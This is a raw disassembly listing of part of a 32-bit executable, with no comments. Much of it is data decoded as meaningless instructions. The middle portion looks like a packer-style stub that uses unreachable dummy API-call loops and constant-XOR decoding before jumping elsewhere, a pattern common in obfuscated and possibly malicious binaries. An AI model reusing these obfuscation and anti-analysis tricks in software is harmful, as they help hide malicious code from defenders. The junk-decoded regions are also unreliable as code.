  40c3c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3c3:	scas   al,BYTE PTR es:[edi]
  40c3c4:	and    eax,0xa389f422
  40c3c9:	shl    ecx,cl
  40c3cb:	out    dx,al
  40c3cc:	fbld   TBYTE PTR [ecx-0x782f7c3c]
  40c3d2:	adc    al,0x3
  40c3d4:	cmp    dl,BYTE PTR [eax]
  40c3d6:	adc    eax,edx
  40c3d8:	xchg   edi,eax
  40c3d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3da:	mov    edi,0x46d66092
  40c3df:	and    bh,BYTE PTR [ecx+0x2f]
  40c3e2:	fstp   QWORD PTR [eax+0x54]
  40c3e5:	jecxz  0x40c3ff
  40c3e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3e8:	(bad)
  40c3eb:	ins    BYTE PTR es:[edi],dx
  40c3ec:	lea    edx,[bx+0x568c]
  40c3f1:	fwait
  40c3f2:	mov    eax,ds:0x579a25bb
  40c3f7:	jg     0x40c3e7
  40c3f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3fa:	pop    esi
  40c3fb:	mov    eax,ds:0x586e987b
  40c400:	jno    0x40c3dc
  40c402:	std    
  40c403:	jle    0x40c397
  40c405:	xchg   ebx,eax
  40c406:	test   eax,0x1bb2d6e8
  40c40b:	ins    BYTE PTR es:[edi],dx
  40c40c:	fidiv  WORD PTR [esi+0x68732e3a]
  40c412:	push   ebx
  40c413:	out    dx,al
  40c414:	dec    eax
  40c415:	ins    BYTE PTR es:[edi],dx
  40c416:	cli    
  40c417:	adc    al,0xa
  40c419:	test   al,0xc3
  40c41b:	fwait
  40c41c:	jp     0x40c3e8
  40c41e:	shl    BYTE PTR [ebp+0xf],0xd1
  40c422:	or     dl,BYTE PTR [esi]
  40c424:	add    BYTE PTR [ebp-0x5c],bh
  40c427:	outs   dx,BYTE PTR ds:[esi]
  40c428:	cdq    
  40c429:	popa   
  40c42a:	int3   
  40c42b:	push   ebx
  40c42c:	inc    edx
  40c42d:	loopne 0x40c46e
  40c42f:	shr    DWORD PTR [edi],cl
  40c431:	push   es
  40c432:	mov    ds:0x901f222e,al
  40c437:	sub    al,0x70
  40c439:	into   
  40c43a:	sbb    BYTE PTR [edi+0x10],0x43
  40c43e:	add    al,0x9
  40c440:	or     al,0x69
  40c442:	mov    ds,WORD PTR [edi+0x2e16e0db]
  40c448:	adc    eax,esi
  40c44a:	ja     0x40c44b
  40c44c:	xor    DWORD PTR ds:[ecx-0x3bf8d7],esi
  40c453:	jp     0x40c461
  40c455:	dec    esp
  40c456:	pop    edx
  40c457:	mov    eax,ds:0x5f3a5287
  40c45c:	mov    ds:0x8a5892e8,al
  40c461:	pop    edi
  40c462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c463:	sbb    esp,DWORD PTR [ecx-0x31]
  40c466:	inc    esi
  40c467:	push   esp
  40c468:	mov    bl,0xb
  40c46a:	sahf   
  40c46b:	loop   0x40c401
  40c46d:	(bad)  
  40c46f:	(bad)  
  40c470:	in     al,dx
  40c471:	jecxz  0x40c439
  40c473:	mov    ebp,0x82e2bd8a
  40c478:	sti    
  40c479:	push   0x424f2b8e
  40c47e:	repnz fild DWORD PTR [edx]
  40c481:	in     eax,dx
  40c482:	cmp    esp,ecx
  40c484:	pop    esp
  40c485:	cmp    eax,0x7f644c3c
  40c48a:	jg     0x40c425
  40c48c:	sahf   
  40c48d:	adc    BYTE PTR [edx],dl
  40c48f:	out    0xda,al
  40c491:	adc    eax,0xf2de1cc8
  40c496:	sbb    DWORD PTR [edx+0x684e96d7],ebx
  40c49c:	and    DWORD PTR [edx],ebp
  40c49e:	inc    esi
  40c49f:	and    BYTE PTR [esi],dh
  40c4a1:	jno    0x40c48c
  40c4a3:	jns    0x40c4ab
  40c4a5:	add    ebx,esp
  40c4a7:	jmp    FWORD PTR [ebp+eiz*1+0x2171c4b8]
  40c4ae:	xor    eax,0x6a3ee378
  40c4b3:	mov    esp,DWORD PTR [ebp+0xfd6ed6b]
  40c4b9:	test   cl,bl
  40c4bb:	ds jge 0x40c50d
  40c4be:	jno    0x40c520
  40c4c0:	imul   edi,DWORD PTR [edx],0x70aadb37
  40c4c6:	scas   eax,DWORD PTR es:[edi]
  40c4c7:	jmp    0xd563d14e
  40c4cc:	jb     0x40c4ce
  40c4ce:	cld    
  40c4cf:	aaa    
  40c4d0:	arpl   WORD PTR [ecx-0xfed89c5],bp
  40c4d6:	jmp    0xd6a70c0f
  40c4db:	mov    al,0x33
  40c4dd:	mov    cl,0x27
  40c4df:	loope  0x40c4ac
  40c4e1:	mov    bl,0x2d
  40c4e3:	div    DWORD PTR [eax+0x3e]
  40c4e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4e7:	sahf   
  40c4e8:	mov    edi,DWORD PTR [edi]
  40c4ea:	xchg   edx,eax
  40c4eb:	aas    
  40c4ec:	add    eax,0x6e5b2094
  40c4f1:	add    eax,0x2ae4003d
  40c4f6:	(bad)  
  40c4f7:	jecxz  0x40c4ba
  40c4f9:	repz mov esi,0xe8691ca4
  40c4ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c500:	mov    ecx,0xa5aed5dc
  40c505:	jbe    0x40c504
  40c507:	les    edi,FWORD PTR [ebp+edx*8-0x40]
  40c50b:	xlat   BYTE PTR ds:[ebx]
  40c50c:	in     eax,dx
  40c50d:	shr    ecx,1
  40c50f:	sahf   
  40c510:	imul   esi,DWORD PTR [eax+0x2d2b91b1],0xbb1d18ce
  40c51a:	jnp    0x40c542
  40c51c:	lahf   
  40c51d:	jmp    0x9d8717ed
  40c522:	mov    cl,0x33
  40c524:	test   al,0xa2
  40c526:	adc    al,0xc1
  40c528:	jmp    0x3681:0x5c621232
  40c52f:	inc    esp
  40c530:	ss dec ecx
  40c532:	xchg   edi,eax
  40c533:	xor    esp,DWORD PTR ds:[edx-0x24]
  40c537:	sub    BYTE PTR [ecx],bh
  40c539:	inc    esp
  40c53a:	dec    esp
  40c53b:	mov    ebp,0xa29ff688
  40c540:	push   es
  40c541:	(bad)  [ebp-0x8a2e897]
  40c547:	fwait
  40c548:	idiv   eax
  40c54a:	call   0x8577:0x10142cfd
  40c551:	outs   dx,BYTE PTR ds:[esi]
  40c552:	mov    eax,0x71ba0f8b
  40c557:	cdq    
  40c558:	inc    ecx
  40c559:	enter  0x9968,0x36
  40c55d:	neg    BYTE PTR [ebx]
  40c55f:	hlt    
  40c560:	inc    esp
  40c561:	ja     0x40c533
  40c563:	imul   DWORD PTR [esi]
  40c565:	ds scas eax,DWORD PTR es:[edi]
  40c567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c568:	or     ebx,DWORD PTR [esi+ecx*1+0x4]
  40c56c:	test   al,ah
  40c56e:	jnp    0x40c52a
  40c570:	pop    ss
  40c571:	cld    
  40c572:	mov    ch,0x8d
  40c574:	pushf  
  40c575:	std    
  40c576:	lods   al,BYTE PTR ds:[esi]
  40c577:	fisttp DWORD PTR [edi+0x3f]
  40c57a:	ror    BYTE PTR [eax+ebx*2],1
  40c57d:	xor    BYTE PTR [eax-0x74],0x57
  40c581:	jmp    0xd81a152f
  40c586:	leave  
  40c587:	fdiv   st,st(4)
  40c589:	mov    ds:0x5aa3fc4f,al
  40c58e:	sub    al,0xb9
  40c590:	imul   ecx,DWORD PTR [eax+0x7e],0xffffffe6
  40c594:	sbb    BYTE PTR ds:0xa74fd5bc,bh
  40c59a:	mov    DWORD PTR [esi],edi
  40c59c:	addr16 cmp ah,0xd4
  40c5a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5a1:	jbe    0x40c5e1
  40c5a3:	imul   esi,DWORD PTR [ebx-0x5b],0xf8aa4456
  40c5aa:	pop    es
  40c5ab:	push   0x9f0b8a05
  40c5b0:	sbb    bh,dl
  40c5b2:	enter  0x1e1a,0x43
  40c5b6:	lods   eax,DWORD PTR ds:[esi]
  40c5b7:	mov    edi,DWORD PTR [edx+0x11]
  40c5ba:	and    al,0x58
  40c5bc:	fstp   TBYTE PTR [edx+0x42]
  40c5bf:	aam    0x79
  40c5c1:	and    eax,0xddfc3ba2
  40c5c6:	into   
  40c5c7:	jae    0x40c5e1
  40c5c9:	test   eax,0xdd415cfa
  40c5ce:	add    BYTE PTR es:[edx+0x4505ab17],bl
  40c5d5:	push   0x1e875639
  40c5da:	shr    DWORD PTR [edx-0x5e988a71],1
  40c5e0:	or     eax,0xd6086510
  40c5e5:	ds inc ebp
  40c5e7:	push   eax
  40c5e8:	mov    al,ds:0xd5c20ff8
  40c5ed:	fsub   QWORD PTR [edx]
  40c5ef:	fs cwde 
  40c5f1:	aaa    
  40c5f2:	pop    ds
  40c5f3:	(bad)  ds:0xce3eb992
  40c5f9:	fdiv   QWORD PTR [edi+0x35]
  40c5fc:	rol    dh,0xb0
  40c5ff:	add    ah,BYTE PTR [esp+esi*8-0x41441f45]
  40c606:	inc    eax
  40c607:	loopne 0x40c5d2
  40c609:	(bad)
  40c60c:	cmp    ecx,DWORD PTR [esi+0x1eb8c228]
  40c612:	mov    WORD PTR [esi],es
  40c614:	jns    0x40c5b4
  40c616:	pop    ds
  40c617:	or     bh,BYTE PTR [eax+0xe2e355e]
  40c61d:	pop    ebp
  40c61e:	mov    ch,0x64
  40c620:	cmp    edi,DWORD PTR ds:0xf0ba8a13
  40c626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c627:	jl     0x40c62d
  40c629:	rcr    DWORD PTR [esi],1
  40c62b:	sbb    eax,0x426497be
  40c630:	jns    0x40c612
  40c632:	mov    ecx,0x5198881f
  40c637:	div    BYTE PTR [eax]
  40c639:	xor    eax,0x95f24f8b
  40c63e:	jae    0x40c67e
  40c640:	cli    
  40c641:	jne    0x40c6bc
  40c643:	inc    esi
  40c644:	add    esi,DWORD PTR [ebx+0x38]
  40c647:	adc    BYTE PTR [edx+ecx*4],dh
  40c64a:	jmp    0x40c664
  40c64c:	mov    dh,0x1d
  40c64e:	mov    bl,0x75
  40c650:	mov    ebp,eax
  40c652:	pushf  
  40c653:	in     eax,dx
  40c654:	cld    
  40c655:	inc    ebx
  40c656:	pop    ss
  40c657:	or     esi,DWORD PTR cs:[ecx]
  40c65a:	lds    esi,FWORD PTR [edi]
  40c65c:	fwait
  40c65d:	or     eax,DWORD PTR [eax-0x41]
  40c660:	and    dh,BYTE PTR [edi]
  40c662:	mov    eax,ds:0xff5dd8d8
  40c667:	lods   eax,DWORD PTR ds:[esi]
  40c668:	mov    WORD PTR [eax+0x5a58b485],fs
  40c66e:	test   ebp,esi
  40c670:	xchg   DWORD PTR [esi-0x1],ebp
  40c673:	sti    
  40c674:	out    0x7f,al
  40c676:	sti    
  40c677:	pop    eax
  40c678:	mov    dh,0xef
  40c67a:	repnz mov ds:0xb872c8a4,al
  40c680:	push   edx
  40c681:	add    dl,BYTE PTR [ecx+0x2]
  40c684:	fwait
  40c685:	cmp    al,0xb9
  40c687:	pop    edi
  40c688:	inc    eax
  40c689:	xchg   DWORD PTR [edx-0x7c6dd4f],esp
  40c68f:	js     0x40c6fe
  40c691:	mov    edi,DWORD PTR [ebx-0x45]
  40c694:	mov    ds:0xc92a8db3,al
  40c699:	scas   al,BYTE PTR es:[edi]
  40c69a:	pusha  
  40c69b:	xchg   BYTE PTR [eax+0x33],al
  40c69e:	ins    BYTE PTR es:[edi],dx
  40c69f:	jecxz  0x40c703
  40c6a1:	sbb    eax,0x4326c965
  40c6a6:	dec    esp
  40c6a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6a8:	push   esi
  40c6a9:	sbb    al,0x1a
  40c6ab:	in     eax,0xc0
  40c6ad:	stos   BYTE PTR es:[edi],al
  40c6ae:	add    al,0xa0
  40c6b0:	fdivr  DWORD PTR [eax]
  40c6b2:	shl    ch,cl
  40c6b4:	bound  ebp,QWORD PTR [esi+edx*2-0xd0437df]
  40c6bb:	sub    DWORD PTR [eax+0x6a41b3d1],esp
  40c6c1:	fldcw  WORD PTR [edx-0x6a]
  40c6c4:	push   ds
  40c6c5:	loopne 0x40c71b
  40c6c7:	daa    
  40c6c8:	xchg   edi,eax
  40c6c9:	pop    es
  40c6ca:	dec    esi
  40c6cb:	inc    edx
  40c6cc:	jbe    0x40c6be
  40c6ce:	ds gs sbb dh,bh
  40c6d2:	aaa    
  40c6d3:	cli    
  40c6d4:	xchg   ebx,eax
  40c6d5:	lods   al,BYTE PTR ds:[esi]
  40c6d6:	pop    ss
  40c6d7:	add    DWORD PTR [eax],esi
  40c6d9:	sbb    cl,bh
  40c6db:	and    ah,BYTE PTR gs:[edx]
  40c6de:	pop    ss
  40c6df:	mov    ah,0xba
  40c6e1:	adc    DWORD PTR [ecx],edi
  40c6e3:	adc    ebp,edx
  40c6e5:	leave  
  40c6e6:	lahf   
  40c6e7:	jp     0x40c72c
  40c6e9:	xchg   edi,eax
  40c6ea:	xor    al,0xf3
  40c6ec:	bound  ebp,QWORD PTR [ebp+0x3da595a1]
  40c6f2:	mov    ebx,0x91d5e976
  40c6f7:	ss in  al,dx
  40c6f9:	dec    ebp
  40c6fa:	aas    
  40c6fb:	std    
  40c6fc:	inc    edx
  40c6fd:	xor    al,0x15
  40c6ff:	pusha  
  40c700:	xchg   edi,eax
  40c701:	in     eax,dx
  40c702:	inc    eax
  40c703:	sbb    eax,0xd92a87db
  40c708:	mov    ds:0x55433e4b,eax
  40c70d:	xchg   edx,eax
  40c70e:	rcr    ebx,1
  40c710:	mov    dl,0x89
  40c712:	icebp  
  40c713:	sub    bh,0xc1
  40c716:	sub    BYTE PTR [edx+edx*2],0xe
  40c71a:	xor    al,0xe8
  40c71c:	cmp    ebx,ebx
  40c71e:	jae    0x40c6d1
  40c720:	aad    0xe7
  40c722:	imul   esi,DWORD PTR [ebp+0x34],0x24f6f9ff
  40c729:	mov    esp,0x26edd843
  40c72e:	push   eax
  40c72f:	mov    bh,0x39
  40c731:	scas   al,BYTE PTR es:[edi]
  40c732:	fbstp  TBYTE PTR [eax-0x4ea58198]
  40c738:	pop    esi
  40c739:	sbb    DWORD PTR [esi],edx
  40c73b:	(bad)  [edx-0x4aabee7b]
  40c741:	pop    ds
  40c742:	jnp    0x40c780
  40c744:	mov    bl,0xd4
  40c746:	iret   
  40c747:	cmp    ebp,DWORD PTR [eax-0x16]
  40c74a:	popf   
  40c74b:	mov    al,0xfa
  40c74d:	(bad)
  40c750:	jnp    0x40c74d
  40c752:	pop    ecx
  40c753:	js     0x40c6d9
  40c755:	rcr    DWORD PTR [esi],0x9c
  40c758:	mov    dl,BYTE PTR [esi]
  40c75a:	out    0xc7,al
  40c75c:	inc    edi
  40c75d:	and    esp,edx
  40c75f:	sub    ch,0xfd
  40c762:	mov    bl,0x22
  40c764:	inc    esi
  40c765:	jl     0x40c7c5
  40c767:	test   eax,0x75a2c73b
  40c76c:	cli    
  40c76d:	push   cs
  40c76e:	aaa    
  40c76f:	(bad)  
  40c770:	in     al,dx
  40c771:	lods   al,BYTE PTR ds:[esi]
  40c772:	cli    
  40c773:	sbb    cl,ch
  40c775:	pushf  
  40c776:	jmp    0xca35:0x6b2e0d9
  40c77d:	(bad)  
  40c77e:	lahf   
  40c77f:	mov    ?,WORD PTR [edi]
  40c781:	pushf  
  40c782:	aaa    
  40c783:	xchg   DWORD PTR [esi+0x11],esi
  40c786:	ins    BYTE PTR es:[edi],dx
  40c787:	xchg   esp,eax
  40c788:	and    eax,0xb7d8a45c
  40c78d:	ins    BYTE PTR es:[edi],dx
  40c78e:	imul   DWORD PTR [ebp-0x705290d4]
  40c794:	(bad)  
  40c795:	aad    0x5f
  40c797:	push   ss
  40c798:	add    dh,cl
  40c79a:	and    BYTE PTR [eax+0x3a],dl
  40c79d:	repnz fwait
  40c79f:	gs push eax
  40c7a1:	jp     0x40c7fb
  40c7a3:	loope  0x40c7df
  40c7a5:	cmp    eax,0x28be437a
  40c7aa:	sub    DWORD PTR [edi],esi
  40c7ac:	fcmovb st,st(2)
  40c7ae:	and    eax,DWORD PTR [eax-0x3c]
  40c7b1:	xchg   BYTE PTR [ebx+0x79],bl
  40c7b4:	and    bl,BYTE PTR [edi+0x783ee20c]
  40c7ba:	retf   0xf15
  40c7bd:	int    0xe3
  40c7bf:	or     BYTE PTR [eax+0xeb9b142],al
  40c7c5:	(bad)  
  40c7c7:	pusha  
  40c7c8:	inc    edx
  40c7c9:	repz leave 
  40c7cb:	js     0x40c7aa
  40c7cd:	in     al,0xe8
  40c7cf:	stos   DWORD PTR es:[edi],eax
  40c7d0:	pop    esi
  40c7d1:	inc    ebp
  40c7d2:	mov    esp,0x251e561
  40c7d7:	xor    ebx,eax
  40c7d9:	xor    edi,ecx
  40c7db:	mov    DWORD PTR [ebp-0x10],edx
  40c7de:	cmp    ebx,DWORD PTR [ebp-0x28]
  40c7e1:	jne    0x40c7f0
  40c7e7:	cmp    edi,DWORD PTR [ebp-0x24]
  40c7ea:	je     0x40c86d
  40c7f0:	mov    esi,DWORD PTR [ebp-0x18]
  40c7f3:	mov    edi,DWORD PTR [ebp-0x14]
  40c7f6:	mov    edi,DWORD PTR [ebp-0x20]
  40c7f9:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c7fc:	xor    edi,eax
  40c7fe:	xor    esi,eax
  40c800:	add    esi,edx
  40c802:	add    edi,0x56424137
  40c808:	imul   edi,edx
  40c80b:	mov    edx,DWORD PTR [ebp+0x8]
  40c80e:	mov    ebx,DWORD PTR [ebp+0xc]
  40c811:	mov    bl,BYTE PTR [ebx+esi*1+0x56424137]
  40c818:	mov    BYTE PTR [edi+edx*1],bl
  40c81b:	mov    edx,DWORD PTR [ebp-0x20]
  40c81e:	mov    esi,DWORD PTR [ebp-0x1c]
  40c821:	mov    esi,DWORD PTR [ebp-0x4]
  40c824:	mov    edi,DWORD PTR [ebp+0x10]
  40c827:	xor    edx,eax
  40c829:	lea    edx,[esi+edx*1+0x56424137]
  40c830:	xor    esi,esi
  40c832:	add    edi,0xa9bdbec9
  40c838:	adc    esi,0xffffa89a
  40c83e:	xor    esi,ecx
  40c840:	mov    DWORD PTR [ebp-0x24],esi
  40c843:	xor    ebx,ebx
  40c845:	xor    edi,eax
  40c847:	mov    esi,edx
  40c849:	add    esi,0xa9bdbec9
  40c84f:	adc    ebx,0xffffa89a
  40c855:	xor    esi,eax
  40c857:	xor    ebx,ecx
  40c859:	mov    DWORD PTR [ebp-0x4],edx
  40c85c:	cmp    esi,edi
  40c85e:	jne    0x40c7f0
  40c864:	cmp    ebx,DWORD PTR [ebp-0x24]
  40c867:	jne    0x40c7f0
  40c86d:	mov    eax,0xbd8d95b3
  40c872:	jmp    0x40c87c
  40c877:	mov    eax,0xbd8d95b0
  40c87c:	pop    edi
  40c87d:	pop    esi
  40c87e:	pop    ebx
  40c87f:	leave  
  40c880:	ret    0xc
  40c883:	push   ebp
  40c884:	mov    ebp,esp
  40c886:	sub    esp,0x40
  40c889:	or     DWORD PTR ds:0x426848,edx
  40c88f:	mov    DWORD PTR [ebp-0x38],0xce941f82
  40c896:	mov    eax,0xffff2df0
  40c89b:	mov    DWORD PTR [ebp-0x34],eax
  40c89e:	add    DWORD PTR ds:0x426828,edx
  40c8a4:	mov    DWORD PTR [ebp-0x40],0xce941f81
  40c8ab:	neg    ecx
  40c8ad:	mov    DWORD PTR [ebp-0x3c],eax
  40c8b0:	mov    eax,ds:0x426874
  40c8b5:	mov    ecx,DWORD PTR ds:0x4268a8
  40c8bb:	sub    ecx,eax
  40c8bd:	and    eax,DWORD PTR [eax+ecx*1]
  40c8c0:	mov    eax,DWORD PTR [ebp-0x38]
  40c8c3:	mov    ecx,DWORD PTR [ebp-0x34]
  40c8c6:	and    DWORD PTR ds:0x426800,0x426820
  40c8d0:	push   ebx
  40c8d1:	xor    DWORD PTR ds:0x42683c,0x2f5a
  40c8db:	push   esi
  40c8dc:	movzx  esi,WORD PTR ds:0x426800
  40c8e3:	xor    DWORD PTR ds:0x426844,esi
  40c8e9:	mov    esi,0x6729a14b
  40c8ee:	xor    eax,esi
  40c8f0:	push   edi
  40c8f1:	mov    edi,0x56424137
  40c8f6:	sub    DWORD PTR ds:0x426844,0x42680c
  40c900:	add    eax,edi
  40c902:	add    DWORD PTR ds:0x42685c,0x4267cc
  40c90c:	mov    DWORD PTR [ebp-0x14],eax
  40c90f:	or     DWORD PTR ds:0x4267f8,0x463f
  40c919:	mov    eax,DWORD PTR [ebp+0x14]
  40c91c:	test   eax,eax
  40c91e:	mov    DWORD PTR ds:0x426858,0x5df9
  40c928:	je     0x40ca06
  40c92e:	movzx  ebx,BYTE PTR ds:0x4267f8
  40c935:	sbb    DWORD PTR ds:0x42684c,ebx
  40c93b:	mov    eax,DWORD PTR [ebp+0x14]
  40c93e:	and    DWORD PTR ds:0x4267b0,0x0
  40c948:	jmp    0x40c95a
  40c94d:	mov    ebx,DWORD PTR ds:0x4267b0
  40c953:	inc    ebx
  40c954:	mov    DWORD PTR ds:0x4267b0,ebx
  40c95a:	cmp    DWORD PTR ds:0x4267b0,0x16
  40c961:	jae    0x40c9a3
  40c967:	cmp    DWORD PTR ds:0x4267b0,0xd
  40c96e:	jbe    0x40c9a3
  40c974:	jmp    0x40c984
  40c979:	push   0x426834
  40c97e:	call   DWORD PTR ds:0x4257c8
  40c984:	cmp    DWORD PTR ds:0x4267b0,0xc
  40c98b:	jne    0x40c99e
  40c991:	mov    ebx,DWORD PTR ds:0x4267b0
  40c997:	inc    ebx
  40c998:	mov    DWORD PTR ds:0x4267b0,ebx
  40c99e:	jmp    0x40c94d
  40c9a3:	mov    eax,DWORD PTR [eax]
  40c9a5:	mov    DWORD PTR ds:0x426818,0x1f
  40c9af:	cmp    DWORD PTR ds:0x426818,0x0
  40c9b6:	je     0x40ca03
  40c9bc:	cmp    DWORD PTR ds:0x426818,0xd
  40c9c3:	jge    0x40ca03
  40c9c9:	jmp    0x40c9d7
  40c9ce:	push   DWORD PTR [ebp-0x10]
  40c9d1:	call   DWORD PTR ds:0x425788
  40c9d7:	cmp    DWORD PTR ds:0x426818,0xe
  40c9de:	jne    0x40c9f1
  40c9e4:	mov    ecx,DWORD PTR ds:0x426818
  40c9ea:	dec    ecx
  40c9eb:	mov    DWORD PTR ds:0x426818,ecx
  40c9f1:	mov    ecx,DWORD PTR ds:0x426818
  40c9f7:	dec    ecx
  40c9f8:	mov    DWORD PTR ds:0x426818,ecx
  40c9fe:	jmp    0x40c9af
  40ca03:	mov    DWORD PTR [ebp-0x14],eax
  40ca06:	inc    eax
  40ca07:	mov    eax,DWORD PTR [ebp-0x38]
  40ca0a:	mov    ecx,DWORD PTR [ebp-0x34]
  40ca0d:	xor    eax,esi
  40ca0f:	or     ecx,ecx
  40ca11:	add    eax,edi
  40ca13:	and    DWORD PTR ds:0x426810,0x0
  40ca1d:	jmp    0x40ca2f
  40ca22:	mov    ebx,DWORD PTR ds:0x426810
  40ca28:	inc    ebx
  40ca29:	mov    DWORD PTR ds:0x426810,ebx
  40ca2f:	cmp    DWORD PTR ds:0x426810,0x1a
  40ca36:	jae    0x40ca85
  40ca3c:	cmp    DWORD PTR ds:0x426810,0xc
  40ca43:	jg     0x40ca85
  40ca49:	jmp    0x40ca64
  40ca4e:	push   DWORD PTR [ebp-0x10]
  40ca51:	push   0x84fa
  40ca56:	push   DWORD PTR [ebp-0x24]
  40ca59:	push   0x5b29
  40ca5e:	call   DWORD PTR ds:0x42578c
  40ca64:	cmp    DWORD PTR ds:0x426810,0xb
  40ca6b:	jne    0x40ca80
  40ca71:	xor    ebx,ebx
  40ca73:	xor    ebx,DWORD PTR ds:0x426810
  40ca79:	inc    ebx
  40ca7a:	mov    DWORD PTR ds:0x426810,ebx
  40ca80:	jmp    0x40ca22
  40ca85:	mov    DWORD PTR [ebp-0x4],eax
  40ca88:	dec    eax
  40ca89:	mov    eax,DWORD PTR [ebp-0x40]
  40ca8c:	mov    ecx,DWORD PTR [ebp-0x3c]
  40ca8f:	sbb    ecx,ebx
  40ca91:	xor    eax,esi
  40ca93:	and    DWORD PTR ds:0x4267c8,0x0
  40ca9d:	mov    ebx,DWORD PTR ds:0x4267c8
  40caa3:	inc    ebx
  40caa4:	mov    DWORD PTR ds:0x4267c8,ebx
  40caaa:	cmp    DWORD PTR ds:0x4267c8,0x22
  40cab1:	jbe    0x40cae3
  40cab7:	jmp    0x40cad6
  40cabc:	push   0x4267b0
  40cac1:	push   0x4b72
  40cac6:	push   0x4267ec
  40cacb:	push   0x53c2
  40cad0:	call   DWORD PTR ds:0x425790
  40cad6:	cmp    DWORD PTR ds:0x4267c8,0x1c
  40cadd:	jb     0x40ca9d
  40cae3:	add    eax,edi
  40cae5:	mov    DWORD PTR [ebp-0x1c],eax
  40cae8:	mov    eax,DWORD PTR [ebp-0x38]
  40caeb:	adc    ecx,0x6112
  40caf1:	mov    ecx,DWORD PTR [ebp-0x34]
  40caf4:	and    DWORD PTR ds:0x42684c,0x0
  40cafe:	jmp    0x40cb12
  40cb03:	xor    ecx,ecx
  40cb05:	or     ecx,DWORD PTR ds:0x42684c
  40cb0b:	inc    ecx
  40cb0c:	mov    DWORD PTR ds:0x42684c,ecx
  40cb12:	cmp    DWORD PTR ds:0x42684c,0x16
  40cb19:	jae    0x40cb4b
  40cb1f:	cmp    DWORD PTR ds:0x42684c,0x23
  40cb26:	jbe    0x40cb4b
  40cb2c:	jmp    0x40cb46
  40cb31:	push   0x437a
  40cb36:	push   0x426828
  40cb3b:	push   0x42600f
  40cb40:	call   DWORD PTR ds:0x4257cc
  40cb46:	jmp    0x40cb03
  40cb4b:	xor    eax,esi
  40cb4d:	and    DWORD PTR ds:0x426828,0x0
  40cb57:	jmp    0x40cb69
  40cb5c:	mov    ecx,DWORD PTR ds:0x426828
  40cb62:	inc    ecx
  40cb63:	mov    DWORD PTR ds:0x426828,ecx
  40cb69:	cmp    DWORD PTR ds:0x426828,0x19
  40cb70:	jae    0x40cbbd
  40cb76:	cmp    DWORD PTR ds:0x426828,0x6
  40cb7d:	jbe    0x40cbbd
  40cb83:	jmp    0x40cb9e
  40cb88:	push   0x426834
  40cb8d:	push   0x7d57
  40cb92:	push   DWORD PTR [ebp-0xc]
  40cb95:	push   DWORD PTR [ebp-0x10]
  40cb98:	call   DWORD PTR ds:0x425794
  40cb9e:	cmp    DWORD PTR ds:0x426828,0x5
  40cba5:	jne    0x40cbb8
  40cbab:	mov    ecx,DWORD PTR ds:0x426828
  40cbb1:	inc    ecx
  40cbb2:	mov    DWORD PTR ds:0x426828,ecx
  40cbb8:	jmp    0x40cb5c
  40cbbd:	add    eax,edi
  40cbbf:	mov    DWORD PTR [ebp-0x28],eax
  40cbc2:	mov    ebx,DWORD PTR [ebp-0x38]
  40cbc5:	mov    eax,DWORD PTR [ebp-0x34]
  40cbc8:	or     eax,DWORD PTR ds:0x42682c
  40cbce:	xor    ebx,esi
  40cbd0:	add    ebx,edi
  40cbd2:	or     ecx,0x4016
  40cbd8:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cbdb:	mov    DWORD PTR ds:0x4267c4,0x15
  40cbe5:	cmp    DWORD PTR ds:0x4267c4,0x0
  40cbec:	je     0x40cc20
  40cbf2:	cmp    DWORD PTR ds:0x4267c4,0x1f
  40cbf9:	jg     0x40cc20
  40cbff:	jmp    0x40cc10
  40cc04:	push   DWORD PTR [ebp-0x14]
  40cc07:	push   DWORD PTR [ebp-0x28]
  40cc0a:	call   DWORD PTR ds:0x425798
  40cc10:	mov    eax,ds:0x4267c4
  40cc15:	dec    eax
  40cc16:	mov    ds:0x4267c4,eax
  40cc1b:	jmp    0x40cbe5
  40cc20:	sub    ecx,0x376272fb
  40cc26:	add    eax,0x2e7c
  40cc2b:	mov    eax,0x751018b5
  40cc30:	sub    DWORD PTR ds:0x42684c,0x4267e4
  40cc3a:	jmp    0x40efd0
  40cc3f:	into   
  40cc40:	in     al,dx
  40cc41:	push   edx
  40cc42:	mov    dh,BYTE PTR [eax+0x34]
  40cc45:	push   esi
  40cc46:	in     al,dx
  40cc47:	imul   edi,ebx,0x3ebaa984
  40cc4d:	aam    0xbd
  40cc4f:	hlt    
  40cc50:	sub    edi,DWORD PTR [ebx+0x7b]
  40cc53:	repnz cwde 
  40cc55:	jnp    0x40ccd2
  40cc57:	fdiv   QWORD PTR [eax-0x3870b964]
  40cc5d:	stos   BYTE PTR es:[edi],al
  40cc5e:	mov    BYTE PTR [edx-0x50],al
  40cc61:	fs inc ecx
  40cc63:	les    ebp,FWORD PTR [edi-0x6f336018]
  40cc69:	popf   
  40cc6a:	rol    eax,1
  40cc6c:	nop
  40cc6d:	stc    
  40cc6e:	push   esi
  40cc6f:	iret   
  40cc70:	or     eax,0x12c69810
  40cc75:	xor    BYTE PTR [eax],ah
  40cc77:	and    BYTE PTR [ecx+0x60],cl
  40cc7a:	inc    ebp
  40cc7b:	test   eax,0xab7d9fa6
  40cc80:	dec    edx
  40cc81:	mul    DWORD PTR [edi+ebx*1+0x2b75da44]
  40cc88:	in     eax,dx
  40cc89:	aaa    
  40cc8a:	xor    dl,BYTE PTR [ecx+0x2b]
  40cc8d:	ror    eax,0xa4
  40cc90:	dec    ebp
  40cc91:	imul   eax,eax,0x84fc75af
  40cc97:	int3   
  40cc98:	sbb    eax,0xe845c836
  40cc9d:	stos   DWORD PTR es:[edi],eax
  40cc9e:	(bad)  
  40cc9f:	leave  
  40cca0:	outs   dx,DWORD PTR ds:[esi]
  40cca1:	push   ds
  40cca2:	inc    ebx
  40cca3:	std    
  40cca4:	xor    bh,cl
